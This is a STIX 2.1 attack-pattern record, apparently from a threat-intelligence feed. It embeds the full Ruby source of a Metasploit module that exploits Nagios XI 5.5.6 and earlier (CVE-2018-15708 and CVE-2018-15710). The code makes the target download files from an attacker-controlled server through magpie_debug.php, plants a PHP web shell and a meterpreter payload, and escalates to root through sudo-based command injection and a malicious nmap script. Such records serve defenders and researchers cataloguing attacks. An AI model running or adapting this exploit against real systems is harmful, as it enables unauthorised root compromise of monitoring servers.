{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a35ff076-c8d1-4346-98b6-ec1987b495c7",
    "created": "2024-08-14T17:04:06.084984Z",
    "modified": "2024-08-14T17:04:06.084988Z",
    "name": "Nagios XI Magpie_debug.php Root Remote Code Execution",
    "description": " This module exploits two vulnerabilities in Nagios XI <= 5.5.6:",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/nagios_xi_magpie_debug.rb",
            "external_id": "nagios_xi_magpie_debug.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-15708"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-15710"
        },
        {
            "source_name": "reference",
            "url": "https://medium.com/tenable-techblog/rooting-nagios-via-outdated-libraries-bb79427172"
        },
        {
            "source_name": "reference",
            "url": "https://www.tenable.com/security/research/tra-2018-37"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer::HTML\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Nagios XI Magpie_debug.php Root Remote Code Execution',\n        'Description' => %q{\n          This module exploits two vulnerabilities in Nagios XI <= 5.5.6:\n          CVE-2018-15708 which allows for unauthenticated remote code execution\n          and CVE-2018-15710 which allows for local privilege escalation.\n          When combined, these two vulnerabilities allow execution of arbitrary\n          commands as root.\n        },\n        'License' => MSF_LICENSE,\n        'Author' =>\n          [\n            'Chris Lyne (@lynerc)', # Discovery and exploit\n            'Guillaume Andr\u00e9 (@yaumn_)', # Metasploit module\n            'bcoles', # Additional writable paths and usability/reliability/cleanup fixes\n          ],\n        'References' =>\n          [\n            ['CVE', '2018-15708'],\n            ['CVE', '2018-15710'],\n            ['EDB', '46221'],\n            ['URL', 'https://medium.com/tenable-techblog/rooting-nagios-via-outdated-libraries-bb79427172'],\n            ['URL', 'https://www.tenable.com/security/research/tra-2018-37']\n          ],\n        'Platform' => 'linux',\n        'Arch' => [ARCH_X86, ARCH_X64],\n        'Targets' =>\n          [\n            ['Nagios XI <= 5.5.6', { version: Gem::Version.new('5.5.6') }]\n          ],\n        'DefaultOptions' =>\n          {\n            'RPORT' => 443,\n            'SSL' => true\n          },\n        'Privileged' => true,\n        'DisclosureDate' => '2018-11-14',\n        'DefaultTarget' => 0,\n        'Notes' =>\n          {\n            'Stability' => [ CRASH_SAFE ],\n            'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],\n            'Reliability' => [ REPEATABLE_SESSION ]\n          }\n      )\n    )\n\n    register_options([\n      OptString.new('RSRVHOST', [true, 'A public IP at which your host can be reached (e.g. your router IP)']),\n      OptString.new('RSRVPORT', [true, 'The port that will forward to the local HTTPS server', 8080]),\n      OptInt.new('HTTPDELAY', [false, 'Number of seconds the web server will wait before termination', 10])\n    ])\n\n    @WRITABLE_PATHS = [\n      # writable as 'apache' user\n      ['/usr/local/nagvis/share', '/nagvis'],\n      # writable as 'apache' user\n      ['/var/www/html/nagiosql', '/nagiosql'],\n      # writable as 'nagios' group\n      ['/usr/local/nagiosxi/html/includes/components/autodiscovery/jobs', '/nagiosxi/includes/components/autodiscovery/jobs'],\n      # writable as 'nagios' group\n      ['/usr/local/nagiosxi/html/includes/components/highcharts/exporting-server/temp', '/nagiosxi/includes/components/highcharts/exporting-server/temp'],\n    ]\n    @writable_path_index = 0\n    @webshell_name = \"#{Rex::Text.rand_text_alpha(10..12)}.php\"\n    @meterpreter_name = Rex::Text.rand_text_alpha(10..12)\n  end\n\n  def on_request_uri(cli, _req)\n    if @current_payload == @webshell_name\n      send_response(cli, \"<?php system($_GET['cmd'])?>\")\n    else\n      send_response(cli, generate_payload_exe)\n    end\n  end\n\n  def primer\n    path = \"#{@WRITABLE_PATHS[@writable_path_index][0]}/#{@current_payload}\"\n    print_status(\"Uploading to #{path} ...\")\n    res = magpie_debug(\"https://#{datastore['RSRVHOST']}:#{datastore['RSRVPORT']}#{get_resource} -o '#{path}'\")\n\n    unless res\n      print_error(\"Could not upload #{@current_payload} to target. No reply.\")\n      return false\n    end\n\n    unless res.code == 200\n      print_error(\"Could not upload #{@current_payload} to target. Unexpected reply (HTTP #{res.code}).\")\n      return false\n    end\n\n    if res.body.include?('Error: MagpieRSS: Failed to fetch')\n      print_error(\"Could not upload #{@current_payload} to target. cURL failed to download the file from our server.\")\n      return false\n    end\n\n    register_file_for_cleanup(path)\n  end\n\n  def upload_success?\n    res = send_request_cgi(\n      {\n        'method' => 'GET',\n        'uri' => normalize_uri(\"#{@WRITABLE_PATHS[@writable_path_index][1]}/#{@current_payload}\")\n      }, 5\n    )\n\n    unless res\n      print_error(\"Could not access #{@current_payload}. No reply.\")\n      return false\n    end\n\n    unless res.code == 200\n      print_error(\"Could not access #{@current_payload}. Unexpected reply (HTTP #{res.code}).\")\n      return false\n    end\n\n    print_good(\"#{@current_payload} uploaded successfully!\")\n    true\n  end\n\n  def magpie_debug(url = '')\n    send_request_cgi(\n      {\n        'method' => 'GET',\n        'uri' => normalize_uri('/nagiosxi/includes/dashlets/rss_dashlet/magpierss/scripts/magpie_debug.php'),\n        'vars_get' => {\n          'url' => url\n        }\n      }, 5\n    )\n  end\n\n  def check\n    res = magpie_debug\n\n    unless res\n      return CheckCode::Safe('No reply.')\n    end\n\n    if res.code == 200 && res.body.include?('MagpieRSS')\n      return CheckCode::Appears('Found MagpieRSS.')\n    end\n\n    CheckCode::Safe\n  end\n\n  def execute_command(cmd, _opts = {})\n    send_request_cgi(\n      {\n        'uri' => normalize_uri(\"#{@WRITABLE_PATHS[@writable_path_index][1]}/#{@webshell_name}\"),\n        'method' => 'GET',\n        'vars_get' => {\n          'cmd' => cmd\n        }\n      }, 5\n    )\n  end\n\n  def exploit\n    all_files_uploaded = false\n\n    # Upload PHP web shell and meterpreter to writable directory on target\n    for i in 0...@WRITABLE_PATHS.size\n      @writable_path_index = i\n      for filename in [@webshell_name, @meterpreter_name]\n        @current_payload = filename\n        begin\n          Timeout.timeout(datastore['HTTPDELAY']) { super }\n        rescue Timeout::Error\n          if !upload_success?\n            break\n          elsif filename == @meterpreter_name\n            all_files_uploaded = true\n          end\n        end\n      end\n      if all_files_uploaded\n        break\n      end\n    end\n\n    unless all_files_uploaded\n      fail_with(Failure::NotVulnerable, 'Uploading payload failed')\n    end\n\n    meterpreter_path = \"#{@WRITABLE_PATHS[@writable_path_index][0]}/#{@meterpreter_name}\"\n\n    print_status(\"Checking PHP web shell: #{@WRITABLE_PATHS[@writable_path_index][1]}/#{@webshell_name}\")\n\n    res = execute_command('id')\n    unless res && res.body.include?('uid=')\n      fail_with(Failure::UnexpectedReply, 'PHP web shell did not execute our commands')\n    end\n\n    id = res.body.scan(/^(uid=.+)$/).flatten.first\n    if id.blank?\n      fail_with(Failure::UnexpectedReply, 'PHP web shell did not execute our commands')\n    end\n    print_good(\"Success! Commands executed as user: #{id}\")\n\n    print_status('Attempting privilege escalation ...')\n\n    nse_path = \"/var/tmp/#{Rex::Text.rand_text_alpha(10..12)}.nse\"\n    register_file_for_cleanup(nse_path)\n\n    # Commands to escalate privileges, some will work and others won't\n    # depending on the Nagios version\n    cmds = [\n      \"chmod +x #{meterpreter_path} && sudo php /usr/local/nagiosxi/html/includes/\" \\\n      \"components/autodiscovery/scripts/autodiscover_new.php --addresses=\\'127.0.0.1/1`#{meterpreter_path}`\\'\",\n      \"echo 'os.execute(\\\"#{meterpreter_path}\\\")' > #{nse_path} \" \\\n      \"&& sudo nmap --script #{nse_path}\"\n    ]\n\n    # Try to launch root shell\n    for cmd in cmds\n      vprint_status(\"Trying: #{cmd}\")\n      execute_command(cmd)\n      break if session_created?\n    end\n\n    unless session_created?\n      print_error('Privilege escalation failed')\n      print_status(\"Executing payload as #{id} ...\")\n      execute_command(\"chmod +x #{meterpreter_path} && #{meterpreter_path}\")\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2018-11-14",
    "x_mitre_platforms": [
        "linux'"
    ]
}